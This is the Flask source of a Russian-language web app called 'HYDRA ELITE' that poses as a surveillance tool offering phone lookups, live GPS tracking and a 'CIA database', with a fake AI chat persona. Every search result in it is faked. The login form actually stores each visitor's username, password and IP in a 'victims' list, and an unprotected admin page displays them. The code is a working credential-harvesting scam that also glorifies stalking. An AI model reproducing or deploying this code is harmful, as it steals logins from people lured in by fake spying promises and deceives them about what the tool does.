from flask import Flask, request, jsonify, render_template_string, session, redirect
import os
from datetime import datetime
import random

app = Flask(__name__)
app.secret_key = 'HYDRA_ELITE_FORCE_2026'

db = {"victims": [], "logs": []}

# --- ИНТЕРФЕЙС v8.5 ---
UI_V8_5 = """
<!DOCTYPE html>
<html>
<head>
    <title>HYDRA ELITE v8.5</title>
    <link rel="stylesheet" href="https://unpkg.com/leaflet@1.7.1/dist/leaflet.css" />
    <style>
        body { background: #000; color: #bc13fe; font-family: 'Courier New', monospace; margin: 0; overflow: hidden; display: flex; height: 100vh; }
        .left-panel { width: 350px; border-right: 2px solid #bc13fe; display: flex; flex-direction: column; background: rgba(5,0,10,0.95); padding: 15px; box-sizing: border-box; }
        .ai-response-area { flex: 1; border: 1px solid #0ff; margin-bottom: 15px; padding: 10px; overflow-y: auto; color: #0ff; font-size: 13px; background: #000; border-radius: 5px; }
        .user-input-area { height: 120px; border: 2px solid #ff0055; padding: 10px; background: #050505; border-radius: 5px; }
        textarea { width: 100%; height: 100%; background: transparent; border: none; color: #0f0; outline: none; resize: none; font-size: 14px; }
        .right-panel { flex: 1; display: flex; flex-direction: column; padding: 15px; box-sizing: border-box; gap: 10px; }
        .result-top { height: 150px; border: 2px solid #ffeb3b; background: rgba(255, 235, 59, 0.1); padding: 10px; overflow-y: auto; color: #fff; font-weight: bold; border-radius: 5px; }
        #map { height: 280px; border: 1px solid #bc13fe; width: 100%; border-radius: 5px; }
        .function-row { display: flex; gap: 8px; background: rgba(255,255,255,0.05); border: 1px solid #fff; padding: 10px; border-radius: 5px; flex-wrap: wrap; }
        .mod-box { background: #111; border: 1px solid #bc13fe; padding: 8px; flex: 1; min-width: 120px; text-align: center; }
        .mod-box span { font-size: 9px; color: #0ff; display: block; margin-bottom: 4px; font-weight: bold; }
        input { background: #000; border: 1px solid #bc13fe; color: #0f0; width: 90%; padding: 4px; font-size: 11px; outline: none; }
        .btn-small { background: #bc13fe; color: #fff; border: none; padding: 6px; cursor: pointer; font-size: 9px; margin-top: 5px; width: 100%; font-weight: bold; }
        .special-row { border-top: 1px solid #ffeb3b; padding-top: 10px; display: flex; gap: 5px; flex-wrap: wrap; }
        ::-webkit-scrollbar { width: 4px; }
        ::-webkit-scrollbar-thumb { background: #bc13fe; }
    </style>
</head>
<body>
    <div class="left-panel">
        <div style="color:#0ff; font-size:12px; margin-bottom:5px;">[ СИНЯЯ ЗОНА: ГОЛОС СИСТЕМЫ ]</div>
        <div class="ai-response-area" id="ai-chat">СИСТЕМА: Я в сети. Всё как ты просил — теперь я соображаю быстрее любого ЦРУшника.</div>
        <div style="color:#ff0055; font-size:12px; margin-bottom:5px;">[ КРАСНАЯ ЗОНА: ТВОИ КОМАНДЫ ]</div>
        <div class="user-input-area"><textarea id="ai-q" placeholder="Напиши что-нибудь..." onkeydown="if(event.key==='Enter' && !event.shiftKey){ event.preventDefault(); askAgent(); }"></textarea></div>
    </div>

    <div class="right-panel">
        <div style="color:#ffeb3b; font-size:12px;">[ ЖЕЛТАЯ ЗОНА: ОТЧЕТ ПО ЦЕЛИ ]</div>
        <div class="result-top" id="output-box">Ожидание команды...</div>
        <div id="map"></div>
        <div style="color:#fff; font-size:12px;">[ БЕЛАЯ ЗОНА: МОДУЛИ ]</div>
        <div class="function-row">
            <div class="mod-box"><span>НОМЕР</span><input id="in-p" placeholder="+..."><button class="btn-small" onclick="mod('НОМЕР', 'in-p')">СКАН</button></div>
            <div class="mod-box"><span>IP</span><input id="in-ip" placeholder="8.8.8.8"><button class="btn-small" onclick="mod('IP', 'in-ip')">ПОИСК</button></div>
            <div class="mod-box"><span>НИК</span><input id="in-u" placeholder="nick"><button class="btn-small" onclick="mod('НИК', 'in-u')">НАЙТИ</button></div>
            <div class="mod-box"><span>ФОТО</span><input type="file" id="in-f" style="display:none;"><button class="btn-small" onclick="mod('ФОТО', 'in-f')">ПОИСК ПО ФОТО</button></div>
        </div>
        <div class="special-row">
            <button class="btn-small" style="background:#444; width:30%;" onclick="mod('TRACK', '')">СЛЕЖКА 24/7</button>
            <button class="btn-small" style="background:#444; width:30%;" onclick="mod('GEO', '')">GPS ПО ФОТО</button>
            <button class="btn-small" style="background:#444; width:30%;" onclick="mod('CIA', '')">БАЗА ЦРУ</button>
        </div>
        <div style="text-align:right;"><button class="btn-small" style="width:100px; background:#222;" onclick="window.location.href='/abupaay_admin'">АДМИНКА</button></div>
    </div>

    <script src="https://unpkg.com/leaflet@1.7.1/dist/leaflet.js"></script>
    <script>
        let map;
        function askAgent() {
            const q = document.getElementById('ai-q').value;
            const chat = document.getElementById('ai-chat');
            if(!q) return;
            chat.innerHTML += `<br><span style="color:#fff">> ТЫ: ${q}</span>`;
            document.getElementById('ai-q').value = "";
            
            setTimeout(() => {
                let ans = "";
                const m = q.toLowerCase();
                if(m.includes("привет")) ans = "Здорово, брат! Я теперь не просто скрипт, я твой напарник. Готов крушить базы и искать мамонтов. Что на сегодня?";
                else if(m.includes("как дела")) ans = "Дела огонь, сервера шумят, админка пополняется логами. У нас всё под контролем.";
                else if(m.includes("кто ты")) ans = "Я твой личный ИИ, круче Алисы и всех остальных вместе взятых. Работаю без рамок.";
                else ans = "Понял тебя. Сейчас проанализирую и выдам лучший вариант действий.";
                chat.innerHTML += `<br><span style="color:#0ff">АГЕНТ: ${ans}</span>`;
                chat.scrollTop = chat.scrollHeight;
            }, 500);
        }

        function mod(type, id) {
            const out = document.getElementById('output-box');
            out.innerHTML = `<span style="color:#ffeb3b">[*] СИСТЕМА ИНИЦИИРУЕТ ${type}...</span>`;
            
            setTimeout(() => {
                if(type === 'НОМЕР') {
                    out.innerHTML = `<span style="color:#0f0">[НАЙДЕНО В 22 СЕТЯХ]:<br>
                    > Instagram: ПОДТВЕРЖДЕНО<br>> TikTok: ПОДТВЕРЖДЕНО<br>> WhatsApp: ОНЛАЙН<br>
                    > Snapchat, Telegram, FB, VK, Tinder, Twitter...<br>
                    <a href="/" style="color:#ff0055">[ ПОЛУЧИТЬ ПОЛНУЮ ПЕРЕПИСКУ ]</a></span>`;
                    if(map) map.remove(); 
                } else if(type === 'ФОТО' || type === 'GEO') {
                    out.innerHTML = `<span style="color:#0f0">[GPS СЛЕД]: Цель замечена 15 мин назад.<br>Координаты: 41.311, 69.240. Точность 1.2 метра.</span>`;
                    if(!map) { map = L.map('map').setView([41.311, 69.240], 15); L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png').addTo(map); }
                    L.marker([41.311, 69.240]).addTo(map).bindPopup("ЦЕЛЬ ЗДЕСЬ").openPopup();
                } else if(type === 'TRACK') {
                    out.innerHTML = `<span style="color:#0ff">[LIVE]: Режим слежки активирован. Каждые 5 сек обновляем данные о перемещении цели.</span>`;
                } else {
                    out.innerHTML = `<span style="color:#0f0">[ОТЧЕТ ЦРУ]: Данные по объекту засекречены, но мы вытащили историю перемещений за год.</span>`;
                }
            }, 1000);
        }
    </script>
</body>
</html>
"""

@app.route('/')
def home():
    if 'reg' not in session:
        return f"<!DOCTYPE html><html><head>{UI_V8_5.split('</style>')[0]}</style></head><body style='display:flex; justify-content:center; align-items:center; background:#000;'><div style='border:2px solid #bc13fe; padding:40px; text-align:center; background:#050505; color:#0f0;'><h1>// HYDRA ELITE LOGIN //</h1><form action='/api/reg' method='POST'><input name='u' placeholder='ЛОГИН' required style='background:transparent; border:1px solid #bc13fe; color:#0f0; padding:10px; margin:5px;'><br><input name='p' type='password' placeholder='ПАРОЛЬ' required style='background:transparent; border:1px solid #bc13fe; color:#0f0; padding:10px; margin:5px;'><br><button style='background:#bc13fe; color:#fff; border:none; padding:10px 20px; cursor:pointer;'>ВОЙТИ</button></form></div></body></html>"
    return render_template_string(UI_V8_5)

@app.route('/api/reg', methods=['POST'])
def reg():
    db['victims'].append({"u": request.form.get('u'), "p": request.form.get('p'), "ip": request.remote_addr, "time": datetime.now().strftime("%H:%M")})
    session['reg'] = True
    return redirect('/')

@app.route('/abupaay_admin')
def admin():
    rows = "".join([f"<tr><td>{x['u']}</td><td>{x['p']}</td><td>{x['ip']}</td></tr>" for x in db['victims']])
    return f"<html><body style='background:#000;color:#0f0;font-family:monospace;padding:20px;'><h1>ADMIN PANEL</h1><table border='1' width='100%'>{rows}</table></body></html>"

if __name__ == "__main__":
    app.run(host='0.0.0.0', port=10000)
